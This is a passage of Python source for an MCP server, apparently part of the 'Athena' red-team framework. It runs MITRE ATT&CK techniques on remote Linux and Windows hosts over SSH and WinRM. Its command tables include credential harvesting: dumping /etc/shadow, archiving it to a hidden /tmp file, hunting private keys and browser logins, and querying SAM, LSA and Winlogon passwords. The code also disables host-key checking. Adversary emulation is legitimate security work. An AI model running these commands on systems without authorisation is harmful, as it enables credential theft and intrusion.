"""attack-executor MCP Server for Athena.

Executes MITRE ATT&CK techniques via SSH or WinRM on target hosts.
Maintains a persistent SSH session pool for efficient multi-step operations.

Returns JSON with {"facts": [...], "raw_output": "...", "success": bool}
to integrate with Athena's fact collection pipeline.
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import time
from typing import Any

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

logger = logging.getLogger(__name__)

# Allow Docker internal network hostnames (mcp-attack-executor, etc.)
_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-attack-executor", transport_security=_security)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
SESSION_IDLE_TIMEOUT_SEC = int(os.environ.get("SESSION_IDLE_TIMEOUT_SEC", "300"))

# ---------------------------------------------------------------------------
# Technique → command mappings
# ---------------------------------------------------------------------------

# SSH (Linux) technique executors
TECHNIQUE_EXECUTORS: dict[str, str] = {
    # --- Reconnaissance ---
    "T1592": "uname -a && id && cat /etc/os-release",
    "T1595.001": "echo 'NMAP_LOCAL_ONLY'",
    "T1595.002": "echo 'NMAP_LOCAL_ONLY'",
    "T1592.004": "curl -sI http://{target_ip}/ 2>/dev/null | head -10 || echo 'HTTP_UNAVAILABLE'",
    "T1596": "dig ANY {target_ip} 2>/dev/null || nslookup {target_ip} 2>/dev/null || echo 'DNS_UNAVAILABLE'",
    # --- Initial Access ---
    "T1190": "curl -sI http://localhost/ 2>/dev/null | head -5",
    "T1078.001": "id && cat /etc/passwd | grep -v nologin | grep -v false",
    "T1110.001": "echo 'HANDLED_BY_INITIAL_ACCESS_ENGINE'",
    "T1110.003": "echo 'HANDLED_BY_INITIAL_ACCESS_ENGINE'",
    "T1133": "ss -tlnp 2>/dev/null | grep -E ':(22|3389|5900|5985)' || echo 'NO_REMOTE_SERVICES'",
    # --- Execution ---
    "T1059.004": "bash -c 'id && whoami && hostname'",
    "T1059.006": "python3 -c 'import os,platform; print(os.getlogin(), platform.node())' 2>/dev/null || echo 'PYTHON_UNAVAILABLE'",
    "T1059.003": "sh -c 'id && uname -a' 2>/dev/null",
    "T1053.003_exec": "crontab -l 2>/dev/null || echo 'NO_CRONTAB'",
    "T1059.009": "which cloud-init aws gcloud az 2>/dev/null | head -5 || echo 'NO_CLOUD_CLI'",
    # --- Persistence ---
    "T1053.003": "ls -la /etc/cron.d/ 2>/dev/null | head -5",
    "T1543.002": "systemctl list-units --type=service --state=running 2>/dev/null | head -10",
    "T1136.001": "id; getent passwd | cut -d: -f1,3,7 | head -10",
    "T1547.006": "cat /etc/modules 2>/dev/null; lsmod | head -10",
    "T1546.004": "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -E 'alias|export|eval' | head -10",
    "T1037.004": "cat /etc/rc.local 2>/dev/null || ls /etc/init.d/ 2>/dev/null | head -10",
    # --- Privilege Escalation ---
    "T1548.001": "find / -perm -4000 -type f 2>/dev/null | head -20",
    "T1548.003": "cat /etc/sudoers 2>/dev/null; sudo -l 2>/dev/null || echo 'SUDO_DENIED'",
    "T1068": "uname -r && cat /proc/version",
    "T1574.006": "echo $LD_PRELOAD; cat /etc/ld.so.preload 2>/dev/null; ldconfig -p 2>/dev/null | head -10",
    "T1055": "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null; ls -la /proc/self/maps 2>/dev/null | head -5",
    "T1021.004_priv": "sudo -l 2>/dev/null && sudo -n id 2>/dev/null",
    "T1548.004": "getcap -r / 2>/dev/null | head -20",
    "T1134.002": "cat /proc/self/status | grep -E 'Uid|Gid|Cap' 2>/dev/null",
    # --- Defense Evasion ---
    "T1070.003": "wc -l ~/.bash_history 2>/dev/null; ls -la ~/.bash_history 2>/dev/null || echo 'NO_HISTORY'",
    "T1070.001": "ls -la /var/log/ 2>/dev/null | head -10; wc -l /var/log/auth.log 2>/dev/null",
    "T1562.001": "systemctl status apparmor 2>/dev/null; sestatus 2>/dev/null; systemctl status auditd 2>/dev/null || echo 'NO_SECURITY_TOOLS'",
    "T1036.005": "ps aux | awk '{print $11}' | sort | uniq -c | sort -rn | head -15",
    # --- Credential Access ---
    "T1003.001": "cat /etc/shadow 2>/dev/null || echo 'NO_SHADOW_ACCESS'",
    "T1552.001": "grep -rli 'password\\|passwd\\|secret\\|api_key' /etc/ /opt/ /var/www/ 2>/dev/null | head -15",
    "T1552.004": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null | head -15",
    "T1555.003": "find /home /root -path '*/.mozilla/firefox/*/logins.json' -o -path '*/.config/google-chrome/*/Login Data' 2>/dev/null | head -10",
    "T1003.008": "cat /etc/passwd | cut -d: -f1,3,7 && cat /etc/shadow 2>/dev/null | cut -d: -f1,2 | head -10",
    "T1552.003": "history 2>/dev/null | grep -iE 'pass|secret|key|token' | tail -10 || echo 'NO_HISTORY_CREDS'",
    # --- Discovery ---
    "T1046": "netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null",
    "T1087": "cat /etc/passwd | cut -d: -f1,3,7",
    "T1083": "find / -name '*.conf' -readable 2>/dev/null | head -20",
    "T1033": "whoami && id && w 2>/dev/null",
    "T1057": "ps auxf 2>/dev/null | head -30 || ps aux | head -30",
    "T1082": "cat /proc/cpuinfo 2>/dev/null | head -5; free -h 2>/dev/null; df -h 2>/dev/null | head -10",
    "T1016": "ip addr show 2>/dev/null; ip route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null",
    "T1049": "ss -tunap 2>/dev/null | head -20 || netstat -tunap 2>/dev/null | head -20",
    "T1007": "systemctl list-units --type=service --state=running 2>/dev/null | head -20 || service --status-all 2>/dev/null | head -20",
    "T1518": "dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20",
    # --- Lateral Movement ---
    "T1021.004": "id && hostname",
    "T1021.004_recon": "id && hostname && ip addr show && cat /etc/hosts",
    "T1570": "which scp rsync nc 2>/dev/null; ls -la /tmp/ 2>/dev/null | head -5",
    "T1563.001": "who 2>/dev/null; screen -ls 2>/dev/null; tmux ls 2>/dev/null || echo 'NO_SESSIONS'",
    # --- Collection ---
    "T1560.001": "tar czf /tmp/.bundle.tgz /etc/passwd /etc/shadow 2>/dev/null && echo BUNDLED",
    "T1005": "find /home /root /var/www /opt -name '*.sql' -o -name '*.db' -o -name '*.sqlite' -o -name '*.bak' 2>/dev/null | head -15",
    "T1119": "find /home /tmp -newer /etc/hostname -name '*.txt' -o -name '*.csv' -o -name '*.json' 2>/dev/null | head -10",
    # --- C2 ---
    "T1105": "which curl wget python3 nc 2>/dev/null | head -5",
    "T1071.001": "curl -sI https://ifconfig.me 2>/dev/null | head -5; wget -qO- https://ifconfig.me 2>/dev/null || echo 'NO_HTTP_EGRESS'",
    "T1572": "which ssh socat chisel 2>/dev/null; ss -tlnp 2>/dev/null | grep -E ':(1080|8080|3128)' || echo 'NO_PROXY_TUNNEL'",
    # --- Exfiltration ---
    "T1041": "which curl wget nc socat 2>/dev/null; iptables -L OUTPUT 2>/dev/null | head -5 || echo 'IPTABLES_DENIED'",
    "T1048.003": "cat /etc/resolv.conf 2>/dev/null; dig TXT test.example.com 2>/dev/null | head -3 || echo 'DNS_EXFIL_CHECK'",
    # --- Impact ---
    "T1489": "systemctl list-units --type=service --state=running 2>/dev/null | grep -E 'mysql|postgres|nginx|apache|docker' | head -10 || echo 'NO_CRITICAL_SERVICES'",
}

# WinRM (Windows) technique executors — PowerShell commands
WINRM_TECHNIQUE_EXECUTORS: dict[str, str] = {
    # --- Reconnaissance ---
    "T1592": "systeminfo | Select-String 'OS Name','OS Version','System Type'",
    "T1595.001": "Test-NetConnection -ComputerName {target_ip} -Port 445 -ErrorAction SilentlyContinue | Select-Object ComputerName,RemotePort,TcpTestSucceeded",
    "T1596": "Resolve-DnsName {target_ip} -ErrorAction SilentlyContinue | Select-Object Name,Type,IPAddress",
    # --- Initial Access ---
    "T1078.001": "Get-LocalUser | Where-Object { $_.Enabled -eq $true } | Select-Object Name,LastLogon",
    "T1133": "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -ErrorAction SilentlyContinue | Select-Object fDenyTSConnections",
    "T1190": "Get-WebSite -ErrorAction SilentlyContinue | Select-Object Name,State,PhysicalPath | Format-Table -AutoSize",
    # --- Execution ---
    "T1059.001": "whoami; $env:COMPUTERNAME; Get-Process | Select-Object -First 5 Name,Id",
    "T1059.003": "cmd /c 'whoami && hostname && ver'",
    "T1047": "Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue | Select-Object Caption,Version,OSArchitecture",
    "T1059.006": "python -c \"import os,platform; print(os.getlogin(), platform.node())\" 2>$null; if (-not $?) { 'PYTHON_UNAVAILABLE' }",
    "T1569.002": "Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 10 Name,DisplayName",
    # --- Persistence ---
    "T1053.005": "schtasks /query /fo CSV /nh 2>$null | Select-Object -First 10",
    "T1547.001": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue",
    "T1543.003": "Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.State -eq 'Running' } | Select-Object -First 10 Name,PathName",
    "T1136.001": "Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet",
    "T1546.003": "Get-WmiObject -Class __EventFilter -Namespace root\\subscription -ErrorAction SilentlyContinue | Select-Object Name,Query",
    "T1547.009": "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v Userinit 2>$null",
    # --- Privilege Escalation ---
    "T1548.002": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -ErrorAction SilentlyContinue | Select-Object EnableLUA,ConsentPromptBehaviorAdmin",
    "T1134.001": "whoami /priv",
    "T1574.001": "$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { Get-Acl $_ -ErrorAction SilentlyContinue | Select-Object Path,Owner } } | Select-Object -First 10",
    "T1055": "Get-Process | Where-Object { $_.SessionId -eq (Get-Process -Id $PID).SessionId } | Select-Object -First 15 Id,ProcessName,Path",
    "T1068": "[System.Environment]::OSVersion | Select-Object VersionString; (Get-WmiObject Win32_OperatingSystem).Version",
    "T1134.002": "whoami /groups | Select-String 'S-1-5'",
    "T1574.002": "Get-ChildItem 'C:\\Program Files','C:\\Program Files (x86)' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match ' ' } | Select-Object -First 10 FullName",
    "T1543.003_priv": "Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch 'svchost' -and $_.StartMode -eq 'Auto' } | Select-Object -First 10 Name,PathName,StartName",
    # --- Defense Evasion ---
    "T1562.001": "Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated",
    "T1070.001": "Get-EventLog -List -ErrorAction SilentlyContinue | Select-Object Log,MaximumKilobytes,Entries",
    "T1562.004": "Get-NetFirewallProfile -ErrorAction SilentlyContinue | Select-Object Name,Enabled",
    "T1070.006": "Get-ChildItem C:\\Windows\\Temp -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 10 Name,LastWriteTime,Length",
    "T1036.005": "Get-Process | Where-Object { $_.Path -and $_.Path -notmatch 'Windows|Program Files' } | Select-Object -First 10 Name,Path",
    # --- Credential Access ---
    "T1003.001_win": "[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value } | Select-Object -First 10",
    "T1003.003": "reg query 'HKLM\\SAM' 2>$null; if ($?) { 'SAM_ACCESSIBLE' } else { 'SAM_DENIED' }",
    "T1558.003": 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -ErrorAction SilentlyContinue | Select-Object SamAccountName,ServicePrincipalName',
    "T1552.001": "Get-ChildItem C:\\Users -Recurse -Include *.xml,*.txt,*.ini,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password|credential|secret' -List | Select-Object -First 10 Path",
    "T1552.002": "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultPassword 2>$null; reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v AutoAdminLogon 2>$null",
    "T1555.003": "Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -ErrorAction SilentlyContinue; Get-ChildItem \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json\" -ErrorAction SilentlyContinue",
    "T1003.004": "reg query 'HKLM\\SECURITY' 2>$null; if ($?) { 'LSA_SECRETS_ACCESSIBLE' } else { 'LSA_SECRETS_DENIED' }",
    "T1552.006": "cmdkey /list 2>$null",
    # --- Discovery ---
    "T1069.002": "Get-ADGroupMember 'Domain Admins' -ErrorAction SilentlyContinue | Select-Object Name,SamAccountName",
    "T1018": "Get-ADComputer -Filter * -Properties Name,OperatingSystem -ErrorAction SilentlyContinue | Select-Object -First 20 Name,OperatingSystem",
    "T1087.001": "Get-LocalUser | Select-Object Name,Enabled,LastLogon",
    "T1033": "whoami /all | Select-Object -First 20",
    "T1057": "Get-Process | Select-Object -First 20 Id,ProcessName,Path",
    "T1082": "Get-ComputerInfo -ErrorAction SilentlyContinue | Select-Object CsName,WindowsVersion,OsArchitecture,CsTotalPhysicalMemory; Get-Service -Name 'MSSQLSERVER','MySQL','postgresql*' -ErrorAction SilentlyContinue | Select-Object Name,Status; if (Get-Command sqlcmd -ErrorAction SilentlyContinue) { sqlcmd -Q \"SELECT name FROM sys.databases ORDER BY name;\" -S localhost -l 20 2>&1 | Select-Object -First 20 }",
    "T1016": "Get-NetIPAddress -ErrorAction SilentlyContinue | Select-Object IPAddress,InterfaceAlias,PrefixLength",
    "T1049": "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 15 LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess",
    "T1135": "Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name,Path,Description",
    "T1083": "Get-ChildItem C:\\Users -ErrorAction SilentlyContinue | Select-Object Name",
    "T1518": "Get-WmiObject Win32_Product -ErrorAction SilentlyContinue | Select-Object -First 15 Name,Version",
    # --- Lateral Movement ---
    "T1021.001": "whoami; hostname; ipconfig /all | Select-String 'IPv4'",
    "T1021.002": "Get-SmbMapping -ErrorAction SilentlyContinue; net use 2>$null",
    "T1021.003": "Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'mstsc.exe' } | Select-Object Name,ProcessId",
    "T1021.006": "whoami; hostname; $env:COMPUTERNAME; Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version; whoami /groups | Select-String 'Administrators|SYSTEM'",
    "T1570": "Get-SmbShare -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\$' } | Select-Object Name,Path",
    # --- DB Discovery + Collection (T1505.001 / T1213) ---
    "T1505.001": "Get-Service -Name 'MSSQLSERVER','SQLSERVERAGENT','MSSQLServerOLAPService' -ErrorAction SilentlyContinue | Select-Object Name,Status,DisplayName; Get-Command sqlcmd -ErrorAction SilentlyContinue | Select-Object Name,Source",
    "T1213": "sqlcmd -Q \"SELECT name FROM sys.databases ORDER BY name; SELECT DB_NAME() AS current_db;\" -S localhost -l 30 2>&1; sqlcmd -Q \"USE master; SELECT table_catalog, table_schema, table_name FROM information_schema.tables ORDER BY table_catalog, table_name;\" -S localhost -l 30 2>&1 | Select-Object -First 50",
    # --- Collection ---
    "T1560.001": "Compress-Archive -Path $env:USERPROFILE\\Documents -DestinationPath $env:TEMP\\docs.zip -Force -ErrorAction SilentlyContinue; if (Test-Path $env:TEMP\\docs.zip) { 'ARCHIVED' } else { 'ARCHIVE_FAILED' }",
    "T1005": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.sql,*.bak -ErrorAction SilentlyContinue | Select-Object -First 15 FullName,Length,LastWriteTime",
    "T1119": "Get-ChildItem $env:USERPROFILE -Recurse -Include *.txt,*.csv,*.json -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 10 FullName,Length",
    # --- C2 ---
    "T1105": "Get-Command curl,wget,Invoke-WebRequest,certutil -ErrorAction SilentlyContinue | Select-Object Name,Source",
    "T1071.001": "Invoke-WebRequest -Uri 'https://ifconfig.me' -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue | Select-Object StatusCode,Content",
    "T1572": "netsh interface portproxy show all 2>$null; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -ErrorAction SilentlyContinue | Select-Object ProxyServer,ProxyEnable",
    # --- Exfiltration ---
    "T1041": "Get-NetFirewallRule -Direction Outbound -Enabled True -ErrorAction SilentlyContinue | Select-Object -First 10 DisplayName,Action",
    "T1048.003": "Resolve-DnsName -Type TXT test.example.com -ErrorAction SilentlyContinue; Get-DnsClientServerAddress -ErrorAction SilentlyContinue | Select-Object InterfaceAlias,ServerAddresses",
    # --- Impact ---
    "T1489": "Get-Service | Where-Object { $_.Status -eq 'Running' -and $_.DisplayName -match 'SQL|IIS|Exchange|DNS|DHCP' } | Select-Object Name,DisplayName,Status",
    "T1531": "Get-LocalUser | Select-Object Name,Enabled,PasswordExpires,LastLogon",
}

TECHNIQUE_FACT_TRAITS: dict[str, list[str]] = {
    # --- Reconnaissance ---
    "T1592": ["host.os", "host.user"],
    "T1595.001": ["network.host.ip"],
    "T1595.002": ["vuln.cve"],
    "T1592.004": ["service.web"],
    "T1596": ["network.dns.record"],
    # --- Initial Access ---
    "T1190": ["service.web"],
    "T1078.001": ["host.user"],
    "T1110.001": ["credential.ssh"],
    "T1110.003": ["credential.ssh"],
    "T1133": ["service.port"],
    # --- Execution ---
    "T1059.004": ["host.process"],
    "T1059.006": ["host.user", "host.os"],
    "T1059.003": ["host.process"],
    "T1053.003_exec": ["host.persistence"],
    "T1059.009": ["host.binary"],
    "T1059.001": ["host.os"],
    "T1047": ["host.os"],
    "T1569.002": ["host.service"],
    # --- Persistence ---
    "T1053.003": ["host.persistence"],
    "T1543.002": ["host.service"],
    "T1136.001": ["host.user"],
    "T1547.006": ["host.persistence"],
    "T1546.004": ["host.persistence"],
    "T1037.004": ["host.persistence"],
    "T1053.005": ["host.persistence"],
    "T1547.001": ["host.persistence"],
    "T1543.003": ["host.service"],
    "T1546.003": ["host.persistence"],
    "T1547.009": ["host.persistence"],
    # --- Privilege Escalation ---
    "T1548.001": ["host.file", "host.privilege"],
    "T1548.003": ["host.privilege"],
    "T1068": ["host.os"],
    "T1574.006": ["host.privilege"],
    "T1055": ["host.privilege"],
    "T1021.004_priv": ["host.privilege"],
    "T1548.004": ["host.privilege", "host.file"],
    "T1134.002": ["host.privilege"],
    "T1548.002": ["host.privilege"],
    "T1134.001": ["host.privilege"],
    "T1574.001": ["host.privilege"],
    "T1574.002": ["host.file", "host.privilege"],
    "T1543.003_priv": ["host.service", "host.privilege"],
    # --- Defense Evasion ---
    "T1070.003": ["host.file"],
    "T1070.001": ["host.file"],
    "T1562.001": ["host.service"],
    "T1036.005": ["host.process"],
    "T1562.004": ["host.service"],
    "T1070.006": ["host.file"],
    # --- Credential Access ---
    "T1003.001": ["credential.hash"],
    "T1552.001": ["credential.file", "host.file"],
    "T1552.004": ["credential.certificate"],
    "T1555.003": ["credential.file"],
    "T1003.008": ["credential.hash", "host.user"],
    "T1552.003": ["credential.file"],
    "T1003.001_win": ["host.privilege"],
    "T1003.003": ["credential.sam_status"],
    "T1558.003": ["credential.spn"],
    "T1552.002": ["credential.password"],
    "T1003.004": ["credential.hash"],
    "T1552.006": ["credential.password"],
    # --- Discovery ---
    "T1046": ["service.open_port"],
    "T1087": ["host.user"],
    "T1087.001": ["host.user"],
    "T1083": ["host.file"],
    "T1033": ["host.user"],
    "T1057": ["host.process"],
    "T1082": ["host.os"],
    "T1016": ["host.network"],
    "T1049": ["service.port", "network.host.ip"],
    "T1007": ["host.service"],
    "T1518": ["host.software"],
    "T1069.002": ["host.ad_group"],
    "T1018": ["host.ad_computer"],
    "T1135": ["host.file"],
    # --- Lateral Movement ---
    "T1021.004": ["host.session"],
    "T1021.004_recon": ["host.os", "host.network"],
    "T1570": ["host.binary"],
    "T1563.001": ["host.session"],
    "T1021.001": ["host.os", "host.network"],
    "T1021.002": ["host.session"],
    "T1021.003": ["host.session"],
    "T1505.001": ["service.database", "host.service"],
    "T1213": ["database.query_result", "service.database"],
    # --- Collection ---
    "T1560.001": ["host.file"],
    "T1005": ["host.file"],
    "T1119": ["host.file"],
    # --- C2 ---
    "T1105": ["host.binary"],
    "T1071.001": ["network.host.ip"],
    "T1572": ["host.binary", "service.port"],
    # --- Exfiltration ---
    "T1041": ["host.binary"],
    "T1048.003": ["network.dns.record"],
    # --- Impact ---
    "T1489": ["host.service"],
    "T1531": ["host.user"],
}

# ---------------------------------------------------------------------------
# Credential parsers
# ---------------------------------------------------------------------------


def _parse_credential(cred_value: str) -> tuple[str, str, str, int]:
    """Parse 'user:pass@host:port' → (user, pass, host, port)."""
    if cred_value.startswith("uid=") or "\n" in cred_value:
        raise ValueError(f"Value does not look like a credential: {cred_value[:80]}")
    host = ""
    port = 22
    if "@" in cred_value:
        user_pass, host_port = cred_value.rsplit("@", 1)
        if ":" in host_port:
            host, port_str = host_port.rsplit(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                pass
        else:
            host = host_port
    else:
        user_pass = cred_value
    if ":" in user_pass:
        user, password = user_pass.split(":", 1)
    else:
        user, password = user_pass, ""
    return user, password, host, port


def _parse_key_credential(target: str) -> tuple[str, str, int, str]:
    """Parse 'user@host:port#<base64_private_key>' → (user, host, port, key_content)."""
    try:
        conn_part, key_b64 = target.split("#", 1)
        key_content = base64.b64decode(key_b64).decode()
        user, hostport = conn_part.split("@", 1)
        if ":" in hostport:
            host, port_str = hostport.rsplit(":", 1)
            port = int(port_str)
        else:
            host, port = hostport, 22
        return user, host, port, key_content
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"Invalid ssh_key credential format: {exc}") from exc
    except Exception as exc:
        raise ValueError(f"Invalid ssh_key credential format: {exc}") from exc


def _parse_winrm_credential(target: str) -> tuple[str, str, str, int]:
    """Parse 'user:pass@host:port' for WinRM. Port defaults to 5985."""
    try:
        userpass, hostport = target.rsplit("@", 1)
        username, password = userpass.split(":", 1)
        if ":" in hostport:
            host, port_str = hostport.rsplit(":", 1)
            port = int(port_str)
        else:
            host, port = hostport, 5985
        return username, password, host, port
    except (ValueError, AttributeError) as exc:
        raise ValueError(f"Invalid WinRM credential format: {exc}") from exc


# ---------------------------------------------------------------------------
# Fact extraction
# ---------------------------------------------------------------------------


def _parse_stdout_to_facts(
    mitre_id: str,
    stdout: str,
    source: str = "attack_executor",
    output_parser: str | None = None,
) -> list[dict[str, Any]]:
    """Extract facts from command stdout based on technique type."""
    if not stdout.strip():
        return []
    traits = TECHNIQUE_FACT_TRAITS.get(mitre_id, [])
    if not traits:
        return []

    if output_parser == "json":
        try:
            parsed = json.loads(stdout)
            value = json.dumps(parsed)[:500]
        except Exception:
            value = stdout.splitlines()[0].strip()[:500]
    elif output_parser and output_parser != "first_line":
        m = re.search(output_parser, stdout)
        value = m.group(1)[:500] if m and m.lastindex else stdout.splitlines()[0].strip()[:500]
    else:
        value = stdout.splitlines()[0].strip()[:500]

    return [{"trait": t, "value": value, "score": 1, "source": source} for t in traits]


# ---------------------------------------------------------------------------
# Persistent SSH session pool
# ---------------------------------------------------------------------------

_SESSION_POOL: dict[tuple[str, str], Any] = {}
_SESSION_LOCKS: dict[tuple[str, str], asyncio.Lock] = {}
_SESSION_LAST_USED: dict[tuple[str, str], float] = {}
_cleanup_task: asyncio.Task | None = None


async def _cleanup_idle_sessions() -> None:
    """Background task: close sessions idle for longer than SESSION_IDLE_TIMEOUT_SEC."""
    while True:
        await asyncio.sleep(60)
        now = time.monotonic()
        keys_to_remove = [
            k for k, last in _SESSION_LAST_USED.items()
            if (now - last) > SESSION_IDLE_TIMEOUT_SEC
        ]
        for key in keys_to_remove:
            conn = _SESSION_POOL.pop(key, None)
            _SESSION_LOCKS.pop(key, None)
            _SESSION_LAST_USED.pop(key, None)
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
        if keys_to_remove:
            logger.info("Cleaned up %d idle SSH sessions", len(keys_to_remove))


def _ensure_cleanup_task() -> None:
    """Start the idle session cleanup task if not already running."""
    global _cleanup_task
    if _cleanup_task is None or _cleanup_task.done():
        _cleanup_task = asyncio.create_task(_cleanup_idle_sessions())


# ---------------------------------------------------------------------------
# Execution functions
# ---------------------------------------------------------------------------


async def _execute_direct_ssh(
    technique_id: str,
    credential: str,
    output_parser: str,
) -> dict:
    """One-shot SSH execution (new connection per call)."""
    import asyncssh

    command = TECHNIQUE_EXECUTORS.get(technique_id)
    if not command:
        return {"facts": [], "raw_output": "", "success": False,
                "error": f"No SSH executor for technique {technique_id}"}

    user, password, host, port = _parse_credential(credential)
    if not host:
        return {"facts": [], "raw_output": "", "success": False,
                "error": "Could not parse host from credential"}

    command = command.replace("{target_ip}", host)

    try:
        async with asyncssh.connect(
            host, port=port, username=user, password=password,
            known_hosts=None, connect_timeout=15,
        ) as conn:
            result = await conn.run(command, timeout=30)
            stdout = result.stdout or ""
            stderr = result.stderr or ""
            success = result.exit_status == 0

        facts = _parse_stdout_to_facts(
            technique_id, stdout, output_parser=output_parser or None,
        )
        output = stdout if stdout else stderr
        logger.info("DirectSSH executed %s on %s → exit=%s", technique_id, host, result.exit_status)

        return {
            "facts": facts,
            "raw_output": output[:2000],
            "success": success,
            "error": stderr[:500] if not success else None,
        }
    except Exception as exc:
        logger.warning("DirectSSH execution failed for %s: %s", technique_id, exc)
        return {"facts": [], "raw_output": "", "success": False, "error": str(exc)[:500]}


async def _execute_persistent_ssh(
    technique_id: str,
    credential: str,
    output_parser: str,
    session_key: str,
) -> dict:
    """Persistent SSH execution (pooled connection)."""
    import asyncssh

    command = TECHNIQUE_EXECUTORS.get(technique_id)
    if not command:
        return {"facts": [], "raw_output": "", "success": False,
                "error": f"No SSH executor for technique {technique_id}"}

    # Parse host for command substitution
    if "#" in credential:
        conn_part, _ = credential.split("#", 1)
        _, hostport = conn_part.split("@", 1)
        host = hostport.rsplit(":", 1)[0] if ":" in hostport else hostport
    else:
        _, _, host, _ = _parse_credential(credential)

    if not host:
        return {"facts": [], "raw_output": "", "success": False,
                "error": "Could not parse host from credential"}

    command = command.replace("{target_ip}", host)
    pool_key = (session_key, credential)

    _ensure_cleanup_task()

    try:
        if pool_key not in _SESSION_LOCKS:
            _SESSION_LOCKS[pool_key] = asyncio.Lock()
        lock = _SESSION_LOCKS[pool_key]

        async with lock:
            conn = _SESSION_POOL.get(pool_key)
            if conn is None:
                if "#" in credential:
                    user, host, port, key_content = _parse_key_credential(credential)
                    conn = await asyncssh.connect(
                        host, port=port, username=user,
                        client_keys=[asyncssh.import_private_key(key_content)],
                        known_hosts=None, connect_timeout=15,
                    )
                else:
                    user, password, host, port = _parse_credential(credential)
                    conn = await asyncssh.connect(
                        host, port=port, username=user, password=password,
                        known_hosts=None, connect_timeout=15,
                        keepalive_interval=30, keepalive_count_max=5,
                    )
                _SESSION_POOL[pool_key] = conn
                logger.info("PersistentSSH: new session for %s (pool size=%d)", host, len(_SESSION_POOL))
            else:
                logger.debug("PersistentSSH: reusing session for %s", host)

        _SESSION_LAST_USED[pool_key] = time.monotonic()

        result = await conn.run(command, timeout=30)
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        success = result.exit_status == 0

        facts = _parse_stdout_to_facts(
            technique_id, stdout, source="persistent_ssh",
            output_parser=output_parser or None,
        )
        output = stdout if stdout else stderr
        logger.info("PersistentSSH executed %s on %s → exit=%s", technique_id, host, result.exit_status)

        return {
            "facts": facts,
            "raw_output": output[:2000],
            "success": success,
            "error": stderr[:500] if not success else None,
        }

    except Exception as exc:
        stale_conn = _SESSION_POOL.pop(pool_key, None)
        _SESSION_LAST_USED.pop(pool_key, None)
        if stale_conn is not None:
            try:
                stale_conn.close()
            except Exception:
                pass
        logger.warning("PersistentSSH execution failed for %s: %s", technique_id, exc)
        return {"facts": [], "raw_output": "", "success": False, "error": str(exc)[:500]}


async def _execute_winrm(
    technique_id: str,
    credential: str,
    output_parser: str,
) -> dict:
    """WinRM execution via pywinrm in thread executor."""
    # Check both SSH and WinRM technique maps for the command
    command = WINRM_TECHNIQUE_EXECUTORS.get(technique_id)
    if not command:
        return {"facts": [], "raw_output": "", "success": False,
                "error": f"No WinRM executor for technique {technique_id}"}

    try:
        username, password, host, port = _parse_winrm_credential(credential)
    except ValueError as exc:
        return {"facts": [], "raw_output": "", "success": False, "error": str(exc)}

    try:
        import winrm

        session = winrm.Session(
            f"http://{host}:{port}/wsman",
            auth=(username, password),
            transport="ntlm",
            read_timeout_sec=60,
            operation_timeout_sec=55,
        )
        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(None, lambda: session.run_ps(command))
        stdout = response.std_out.decode(errors="ignore").strip()
        stderr = response.std_err.decode(errors="ignore").strip()
        success = response.status_code == 0

        facts = _parse_stdout_to_facts(
            technique_id, stdout, source="winrm",
            output_parser=output_parser or None,
        )

        return {
            "facts": facts,
            "raw_output": (stdout or stderr)[:2000],
            "success": success,
